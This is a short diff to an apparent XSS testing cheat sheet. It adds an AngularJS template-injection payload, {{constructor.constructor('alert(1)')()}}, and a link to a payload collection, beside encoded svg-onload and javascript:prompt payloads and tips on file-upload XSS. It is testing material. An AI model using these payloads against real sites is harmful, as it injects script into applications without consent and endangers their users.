@@ -97,6 +97,11 @@ E.g : http://www.example.net/something%CA%BA%EF%BC%9E%EF%BC%9Csvg%20onload=alert
  Octal encoding (javascript:prompt(1) to javascript:'\160\162\157\155\160\164\50\61\51) <br>
  
  <br>
+ <h1> Angular JS </h1><br>
+ If the app inspect element contains "ng-app" this is using Angular JS, if input is within this, try Angular JS payload <br>
+ {{constructor.constructor('alert(1)')()}}<br>
+ https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md <br>
+ <br>
  <h3> File Upload XSS </h3><br>
  If you find a file upload feature, try naming the file to an xss payload. Use burp intercept to rename files <br>
  Does the app allow .svg files to be uploaded? if yes, enter the code within an svg file <br>
